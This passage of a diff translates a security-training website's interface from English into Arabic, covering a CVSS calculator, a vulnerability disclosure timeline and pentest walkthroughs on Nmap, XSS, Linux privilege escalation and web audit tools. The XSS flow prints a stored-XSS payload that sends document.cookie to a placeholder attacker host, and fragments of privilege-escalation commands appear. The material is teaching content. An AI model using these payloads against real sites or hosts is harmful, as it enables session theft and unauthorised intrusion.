+                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">لا يوجد (0)</button>
                   </div>
                 </div>
 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Availability (A)</strong>
-                    <span>Can the service be shut down or crashed?</span>
+                    <strong>توافر الخدمة (A)</strong>
+                    <span>هل يمكن تعطيل الخدمة أو إيقاف تشغيلها؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="A">
-                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">High (0.56)</button>
-                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">Low (0.22)</button>
-                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">None (0)</button>
+                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">كاملة (0.56)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">جزئية (0.22)</button>
+                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">لا يوجد (0)</button>
                   </div>
                 </div>
               </div>
 
               <!-- Output Box -->
               <div class="calc-score-display critical" id="cvssResultDisplay" style="margin-top: 25px; padding: 20px; border-radius: 8px; border: 2px solid; text-align: center;">
-                <div style="font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; color: rgba(255,255,255,0.7);">Calculated Base Score</div>
+                <div style="font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; color: rgba(255,255,255,0.7);">النتيجة الأساسية المحسوبة</div>
                 <div id="cvssScoreText" style="font-size: 3rem; font-weight: bold; margin: 5px 0;">9.8</div>
                 <div id="cvssVectorText" style="font-family: 'Fira Code', monospace; font-size: 0.8rem; background: rgba(0,0,0,0.3); padding: 5px 10px; border-radius: 4px; display: inline-block;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
               </div>
@@ -22213,35 +22213,35 @@ print("[+] Diagnostic payload sent. Attempting connection to telnet shell...")</
           }
         },
         'timeline': {
-          title: "Vulnerability Timeline Tracker",
+          title: "مسار زمن اكتشاف الثغرات وتنسيقها",
           tabs: {
             details: `
-              <h3>Vulnerability Disclosure Timeline</h3>
-              <p>Tracking the full response timeline from zero-day discovery to final vendor patch coordination.</p>
+              <h3>جدول الكشف عن الثغرات الأمنية</h3>
+              <p>تتبع الجدول الزمني الكامل للاستجابة بدءاً من اكتشاف الثغرة (Zero-day) وحتى التنسيق النهائي وإصدار الرقعة الأمنية للشركة المصنعة.</p>
               
               <div style="position: relative; border-left: 2px solid rgba(0, 229, 255, 0.3); margin: 25px 0 25px 20px; padding-left: 20px;">
                 <div style="margin-bottom: 20px; position: relative;">
                   <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #ff5555;"></div>
-                  <strong style="color: #ff5555;">Day 0 (May 1, 2026)</strong>
-                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Vulnerability identified inside source code and target device memory dumps during blackbox assessment.</p>
+                  <strong style="color: #ff5555;">اليوم 0 (1 مايو 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">اكتشاف الثغرة الأمنية داخل كود المصدر وتحليل تفريغ ذاكرة الجهاز المصاب أثناء اختبار الاختراق الصندوق الأسود (Black-box).</p>
                 </div>
                 
                 <div style="margin-bottom: 20px; position: relative;">
                   <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #ffd500;"></div>
-                  <strong style="color: #ffd500;">Day 3 (May 4, 2026)</strong>
-                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Full proof-of-concept exploit validated. Security advisory written and dispatched to security@tp-link.com.</p>
+                  <strong style="color: #ffd500;">اليوم 3 (4 مايو 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">إنشاء سكريبت إثبات المفهوم (PoC) بنجاح. كتابة تقرير التحذير الأمني وإرساله إلى فريق أمن الشركة المصنعة.</p>
                 </div>
 
                 <div style="margin-bottom: 20px; position: relative;">
                   <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #00e5ff;"></div>
-                  <strong style="color: #00e5ff;">Day 7 (May 8, 2026)</strong>
-                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Vendor security team acknowledges receipt of report, confirms root-cause investigation is underway.</p>
+                  <strong style="color: #00e5ff;">اليوم 7 (8 مايو 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">فريق الأمن التابع للشركة المصنعة يؤكد استلام التقرير وبدء التحقيق في الأسباب البرمجية للثغرة.</p>
                 </div>
 
                 <div style="margin-bottom: 0; position: relative;">
                   <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #50fa7b;"></div>
-                  <strong style="color: #50fa7b;">Day 45 (June 15, 2026)</strong>
-                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Vendor releases beta patch verification. CVE assigned. Final firmware release coordinated and published.</p>
+                  <strong style="color: #50fa7b;">اليوم 45 (15 يونيو 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">إصدار النسخة التجريبية المصلحة والتحقق منها. تعيين كود الـ CVE. إصدار التحديث الرسمي النهائي وتعميمه.</p>
                 </div>
               </div>
             `
@@ -22250,48 +22250,48 @@ print("[+] Diagnostic payload sent. Attempting connection to telnet shell...")</
       },
       walkthrough: {
         'nmap-notes': {
-          title: "Nmap Scan Deep Dive",
+          title: "فحص الشبكات المتقدم بـ Nmap",
           tabs: {
             details: `
-              <h3>Understanding Port Scanning Fundamentals</h3>
-              <p>Nmap (Network Mapper) is the primary reconnaissance tool for any network pentest. It maps active nodes, port bindings, protocols, and vulnerabilities.</p>
-              <h4>Key Scan Types:</h4>
+              <h3>أساسيات فحص المنافذ والشبكات</h3>
+              <p>أداة Nmap (Network Mapper) هي الأداة الأساسية لعمليات الاستطلاع وفحص الشبكات في أي اختبار اختراق. تقوم برسم خريطة للشبكة، كشف الأجهزة النشطة، البورتات المفتوحة، الخدمات وأنظمة التشغيل.</p>
+              <h4>أنواع الفحص الرئيسية:</h4>
               <ul>
-                <li><strong>SYN Scan (-sS):</strong> Stealth scan. Does not complete the 3-way handshake (sends SYN, receives SYN-ACK, sends RST).</li>
-                <li><strong>Connect Scan (-sT):</strong> Full TCP connection. Slower and logs connection attempt.</li>
-                <li><strong>UDP Scan (-sU):</strong> Scans UDP ports. Slower due to ICMP Port Unreachable packet rate limits.</li>
+                <li><strong>فحص SYN (-sS):</strong> فحص التسلل المخفي. لا يكمل عملية المصافحة الثلاثية (يرسل SYN، يستقبل SYN-ACK، ويرد بـ RST لإغلاق الاتصال فوراً).</li>
+                <li><strong>فحص Connect (-sT):</strong> اتصال TCP كامل. أبطأ ويتم تسجيل محاولة الاتصال بوضوح في سجلات نظام الضحية.</li>
+                <li><strong>فحص UDP (-sU):</strong> يفحص منافذ UDP. يعتبر أبطأ نظراً للقيود المفروضة على معدل إرسال حزم ICMP Port Unreachable.</li>
               </ul>
             `,
             flow: `
-              <h3>STEALTH SYN SCAN (TCP Half-Open)</h3>
+              <h3>فحص التسلل المخفي (TCP Half-Open)</h3>
               <div class="attack-flow-visual">
                 <div class="flow-step">
                   <div class="flow-step-number">1</div>
                   <div class="flow-step-body">
-                    <h4>SYN Packet</h4>
-                    <p>Nmap sends a TCP SYN packet to target port (e.g., 80).</p>
+                    <h4>حزمة SYN</h4>
+                    <p>ترسل أداة Nmap حزمة TCP SYN إلى المنفذ المستهدف (مثل بورت 80).</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">2</div>
                   <div class="flow-step-body">
-                    <h4>SYN-ACK Reply</h4>
-                    <p>If port is OPEN, server replies with SYN-ACK. (If closed, replies with RST).</p>
+                    <h4>رد SYN-ACK</h4>
+                    <p>إذا كان البورت مفتوحاً، يرد السيرفر بحزمة SYN-ACK. (أما إذا كان مغلقاً، فيرد بـ RST).</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">3</div>
                   <div class="flow-step-body">
-                    <h4>RST Packet</h4>
-                    <p>Nmap immediately sends a RST packet to teardown connection before OS socket layer logs it.</p>
+                    <h4>حزمة RST</h4>
+                    <p>يقوم أداة Nmap فوراً بإرسال حزمة RST لقطع الاتصال قبل أن يقوم نظام التشغيل للضحية بتسجيل محاولة الاتصال في السجلات.</p>
                   </div>
                 </div>
               </div>
             `,
             poc: `
-              <h3>Useful Nmap Command Cheat Sheet</h3>
+              <h3>أهم أوامر Nmap المستخدمة في العمليات</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_nmap_commands')">Copy</button>
                 <pre id="poc_nmap_commands" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;"># Fast stealth scan with OS detection and service version detection
@@ -22307,48 +22307,48 @@ nmap --script vuln 10.10.10.24</pre>
           }
         },
         'xss-basics': {
-          title: "Cross-Site Scripting (XSS) Walkthrough",
+          title: "شرح تفصيلي لثغرات حقن النصوص (XSS)",
           tabs: {
             details: `
-              <h3>XSS Vulnerabilities Overview</h3>
-              <p>Cross-Site Scripting occurs when an application receives untrusted user input and processes it into a webpage header or body without escaping or sanitization.</p>
-              <h4>Types of XSS:</h4>
+              <h3>نظرة عامة على ثغرات XSS</h3>
+              <p>تحدث ثغرات حقن النصوص (Cross-Site Scripting) عندما يقبل التطبيق مدخلات من المستخدم ويقوم بعرضها أو إدراجها داخل ترويسات الاستجابة أو جسم الصفحة مباشرة دون معالجة أو ترميز للحروف الحساسة.</p>
+              <h4>أنواع ثغرات XSS:</h4>
               <ul>
-                <li><strong>Stored XSS:</strong> Exploit payload is saved on target server (e.g., comment section) and executes when other users view the page.</li>
-                <li><strong>Reflected XSS:</strong> Exploit payload is embedded in target URL and reflected back off web server response (e.g., search queries).</li>
-                <li><strong>DOM-based XSS:</strong> Client-side JavaScript parses URL hashes or variables and passes them directly to sink functions like <code>innerHTML</code>.</li>
+                <li><strong>Stored XSS (المخزن):</strong> يتم حفظ الكود الخبيث داخل قاعدة بيانات الخادم (مثل صندوق التعليقات) ويتم تنفيذه لدى أي مستخدم يزور الصفحة.</li>
+                <li><strong>Reflected XSS (المنعكس):</strong> يتم إرسال الكود الخبيث في رابط الطلب وينعكس مباشرة من الخادم إلى صفحة الاستجابة دون تخزين.</li>
+                <li><strong>DOM-based XSS (المستند للواجهة):</strong> يحدث بالكامل داخل المتصفح من جهة العميل، حيث يقرأ كود الجافا سكريبت روابط الصفحة ويمررها مباشرة لدوال حساسة مثل <code>innerHTML</code>.</li>
               </ul>
             `,
             flow: `
-              <h3>Stored XSS Execution</h3>
+              <h3>مسار تنفيذ ثغرة Stored XSS</h3>
               <div class="attack-flow-visual">
                 <div class="flow-step">
                   <div class="flow-step-number">1</div>
                   <div class="flow-step-body">
-                    <h4>Payload Submission</h4>
-                    <p>Attacker submits a guestbook entry containing <code>&lt;script&gt;fetch('http://hacker.com/log?c=' + document.cookie)&lt;/script&gt;</code>.</p>
+                    <h4>إرسال الكود الخبيث</h4>
+                    <p>يقوم المهاجم بإرسال تعليق يحتوي على الكود الخبيث: <code>&lt;script&gt;fetch('http://hacker.com/log?c=' + document.cookie)&lt;/script&gt;</code>.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">2</div>
                   <div class="flow-step-body">
-                    <h4>Database Storage</h4>
-                    <p>The insecure application stores the payload directly in the database without sanitizing HTML tags.</p>
+                    <h4>التخزين في قاعدة البيانات</h4>
+                    <p>يقوم التطبيق المصاب بحفظ التعليق في قاعدة البيانات مباشرة دون تصفية أو معالجة وسوم الـ HTML.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">3</div>
                   <div class="flow-step-body">
-                    <h4>Execution on Victim</h4>
-                    <p>Victim views guestbook. Server loads entry. Victim's browser executes script, sending session cookies to attacker.</p>
+                    <h4>التنفيذ على الضحية</h4>
+                    <p>يزور المستخدم الصفحة، فيقوم الخادم بتحميل التعليق من قاعدة البيانات وعرضه. يقوم متصفح الضحية بتنفيذ السكريبت وإرسال الكوكيز الحساسة للمهاجم.</p>
                   </div>
                 </div>
               </div>
             `,
             poc: `
-              <h3>Exploit Payloads Examples</h3>
+              <h3>أمثلة لأكواد استغلال XSS</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_xss_payloads')">Copy</button>
                 <pre id="poc_xss_payloads" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffd500;">&lt;!-- Basic Alert Payload --&gt;
@@ -22366,20 +22366,20 @@ nmap --script vuln 10.10.10.24</pre>
           }
         },
         'linux-privesc': {
-          title: "Linux Privilege Escalation Techniques",
+          title: "تقنيات تصعيد الصلاحيات في أنظمة Linux",
           tabs: {
             details: `
-              <h3>Escalating Local User to Root</h3>
-              <p>Once a local shell is obtained, privilege escalation refers to exploitation vectors to elevate rights to the local root administrator.</p>
-              <h4>Key Assessment Vectors:</h4>
+              <h3>ترقية حساب مستخدم عادي إلى جذر النظام (Root)</h3>
+              <p>بمجرد الحصول على وصول أولي للنظام كعضو عادي، تبدأ مرحلة البحث عن ثغرات أمنية أو أخطاء إعداد داخل النظام لتصعيد الصلاحيات والحصول على صلاحية Root الكاملة.</p>
+              <h4>أبرز نواقل التصعيد المتبعة:</h4>
               <ul>
-                <li><strong>SUID Binaries:</strong> Executables run with owner rights. Misconfigured owners allow shell breakout (e.g., custom scripts, bash, find).</li>
-                <li><strong>Sudo privileges:</strong> Command execution rights allowed by <code>/etc/sudoers</code>. Check via <code>sudo -l</code>.</li>
-                <li><strong>Writable configuration files:</strong> Writable <code>/etc/passwd</code> or <code>/etc/shadow</code> or cron jobs.</li>
+                <li><strong>ملفات SUID الثنائية:</strong> ملفات تعمل بصلاحية المالك الأساسي لها. أخطاء إعداد هذه الملفات قد تسمح بالخروج والهروب منها للحصول على سطر أوامر Root.</li>
+                <li><strong>صلاحيات Sudo:</strong> التحقق من الصلاحيات الممنوحة للمستخدم داخل ملف <code>/etc/sudoers</code> عبر كتابة <code>sudo -l</code>.</li>
+                <li><strong>ملفات الإعدادات القابلة للكتابة:</strong> مثل وجود صلاحية تعديل لملف <code>/etc/passwd</code> أو تعديل سكريبتات تعمل كـ cron jobs بصلاحية Root.</li>
               </ul>
             `,
             poc: `
-              <h3>SUID and Sudo Escalation Payloads</h3>
+              <h3>أوامر ووسائل استغلال تصعيد الصلاحيات (SUID & Sudo)</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_privesc_commands')">Copy</button>
                 <pre id="poc_privesc_commands" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;"># 1. Check for SUID binaries in standard directories
@@ -22399,31 +22399,31 @@ sudo nano
           }
         },
         'burp-suite': {
-          title: "Burp Suite Pro Tips for Web Audits",
+          title: "أسرار واحتراف العمل بـ Burp Suite",
           tabs: {
             details: `
-              <h3>Maximizing Proxy & Auditing Workflows</h3>
-              <p>Burp Suite is the industry-standard HTTP intercepting proxy. It allows auditing parameters, modifying headers in real-time, and launching brute force attacks.</p>
-              <h4>Core Components:</h4>
+              <h3>تحقيق الاستفادة القصوى من عمليات فحص وتعقب الـ HTTP</h3>
+              <p>أداة Burp Suite هي الأداة القياسية في مجال فحص واختبار اختراق تطبيقات الويب. تتيح لك اعتراض وإدارة وتعديل طلبات واستجابات HTTP في الوقت الفعلي.</p>
+              <h4>المكونات الأساسية للبرنامج:</h4>
               <ul>
-                <li><strong>Proxy:</strong> Intercepts, reviews, and modifies client-server requests.</li>
-                <li><strong>Repeater:</strong> Manually modifies and resends single HTTP requests repeatedly to isolate parameter responses.</li>
-                <li><strong>Intruder:</strong> Automates customized requests for credential stuffing, fuzzing, and directory discovery.</li>
+                <li><strong>Proxy:</strong> يقوم باعتراض ومراجعة وتعديل الطلبات المتبادلة بين المتصفح والسيرفر.</li>
+                <li><strong>Repeater:</strong> يستخدم لتعديل وإعادة إرسال طلب واحد يدوياً لدراسة ردود أفعال السيرفر ومعالجة المتغيرات بدقة.</li>
+                <li><strong>Intruder:</strong> أداة قوية لأتمتة الهجمات التكرارية مثل حقن المدخلات (Fuzzing) وتخمين كلمات المرور وفحص المسارات.</li>
               </ul>
             `
           }
         },
         'feroxbuster': {
-          title: "Fast Directory Discovery with Feroxbuster",
+          title: "كشف المسارات المخفية بسرعة فائقة عبر Feroxbuster",
           tabs: {
             details: `
-              <h3>Recursive Content Discovery</h3>
-              <p>Feroxbuster is a high-speed multi-threaded directory busting tool written in Rust. It discovers hidden directories, configuration backups, and administrative endpoints.</p>
-              <h4>Key Strengths:</h4>
+              <h3>البحث التكراري السريع عن محتويات السيرفر</h3>
+              <p>أداة Feroxbuster هي أداة سريعة جداً مكتوبة بلغة Rust للبحث التكراري (Recursive) عن الملفات والمجلدات المخفية، ملفات النسخ الاحتياطي ولوحات التحكم الحساسة.</p>
+              <h4>نقاط القوة الرئيسية:</h4>
               <ul>
-                <li><strong>High Speed:</strong> Handles thousands of requests per second.</li>
-                <li><strong>Auto-Recursion:</strong> Dynamically scans newly discovered sub-directories.</li>
-                <li><strong>Smart Filters:</strong> Excludes specific response codes, sizes, or line counts to prevent false positives.</li>
+                <li><strong>سرعة فائقة:</strong> تعتمد على معالجة الخيوط المتعددة (Multi-threaded) لإرسال آلاف الطلبات في الثانية.</li>
+                <li><strong>التكرار التلقائي (Auto-Recursion):</strong> تبدأ فحص المجلدات الجديدة المكتشفة تلقائياً ودون تدخل.</li>
+                <li><strong>الفلاتر الذكية:</strong> إمكانية تصفية الاستجابات بناءً على كود الحالة، حجم الصفحة، أو عدد الأسطر لمنع النتائج الإيجابية الزائفة.</li>
               </ul>
             `
           }
@@ -22497,10 +22497,10 @@ sudo nano
         html += `<div class="cve-tabs">`;
         tabsAvailable.forEach(tab => {
           const isActive = activeResearchTab === tab;
-          let label = tab.charAt(0).toUpperCase() + tab.slice(1);
-          if (tab === 'poc') label = 'Proof of Concept';
-          if (tab === 'flow') label = 'Attack Flow';
-          if (tab === 'quiz') label = 'Quick Assessment';
+          let label = tab === 'details' ? 'التفاصيل' : tab;
+          if (tab === 'poc') label = 'إثبات المفهوم (PoC)';
+          if (tab === 'flow') label = 'مسار الهجوم';
+          if (tab === 'quiz') label = 'تقييم سريع';
           html += `<button class="cve-tab ${isActive ? 'active' : ''}" onclick="switchResearchTab('${tab}')">${label}</button>`;
         });
         html += `</div>`;
